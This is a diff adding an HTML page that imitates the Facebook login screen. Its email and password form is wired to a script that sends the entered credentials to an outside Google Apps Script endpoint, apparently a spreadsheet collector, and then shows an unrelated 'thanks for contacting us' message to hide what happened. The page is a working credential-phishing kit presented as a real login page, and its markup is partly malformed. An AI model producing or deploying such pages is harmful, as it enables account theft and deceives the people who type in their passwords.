@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href="https://unpkg.com/tailwindcss@^1.0/dist/tailwind.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>facebook</title>
+    <link href="logo.png" rel="icon">
+    <link href="logo.png" rel="apple-touch-icon">
+    
+</head>
+<body>
+    <form method="post" name="google-sheet">
+    <section class="text-gray-600 body-font">
+        <div class="container px-5 py-24 mx-auto flex flex-wrap items-center">
+          <div class="lg:w-3/5 md:w-1/2 md:pr-16 lg:pr-0 pr-0">
+            <h1 class="title-font font-medium text-5xl text-blue-500 text-lg">facebook</h1>
+            <p class="leading-relaxed mt-4 text-lg">Connect with friend and the world around you on Facebook.</p>
+          </div>
+          <div class="lg:w-2/6 md:w-1/2 bg-gray-100 rounded-lg p-8 flex flex-col md:ml-auto w-full mt-10 md:mt-0">
+            <div class="relative mb-4">
+              <label for="full-name" class="leading-7 text-sm text-gray-600"></label>
+              <input type="text" id="email" name="Email" placeholder="Email address or phone number" class="w-full bg-white rounded border border-gray-300 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 text-base outline-none text-gray-700 py-1 px-3 leading-8 transition-colors duration-200 ease-in-out">
+            </div>
+            <div class="pass-box">
+              <label for="password" class="leading-7 text-sm text-gray-600"></label>
+              <input type="password" id="password" name="Password" placeholder="password" class="w-full bg-white rounded border border-gray-300 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 text-base outline-none text-gray-700 py-1 px-3 leading-8 transition-colors duration-200 ease-in-out<i class="fa fa-eye-slash" aria-hidden="true"></i>         
+            </div><br>
+            <div>
+            <center class="text-white bg-indigo-500 border-0 py-2 px-6 focus:outline-none hover:bg-indigo-600 rounded text-lg"><button type="submit" name="submit" >log In</button>      
+            </div>
+           <center long> <h1 class="text-xs text-red bold text-blue-500 mt-3 text-lg">Forgot password?</h1><br>
+            <label for="password" class="leading-7 text-sm text-gray-600"></label> 
+              <center><button class="text-white  bg-green-500 border-0 py-2 px-8 focus:outline-none hover:bg-green-600 rounded text-lg">Create new account</button>
+            <center><br><p><span href="#" class="title-font font-medium text-1xl text-black-500 ">Create a Page</span> for a celebrity, brand or business.</p></center>
+          </div>
+        </div>
+      </section>
+      </form>
+      
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbw3LEme3B8kcpKH_Vd0g_Lj-EJP4oWJuANeUkrAXDREaq8li4VolPT2hTxD2eUGhHBcBg/exec'
+        const form = document.forms['google-sheet']
+        
+         form.addEventListener('submit', e => {
+         e.preventDefault()
+         fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
+            .catch(error => console.error('Error!', error.message))
+    })
+  </script>
+   
+    
+</body>
+</html>
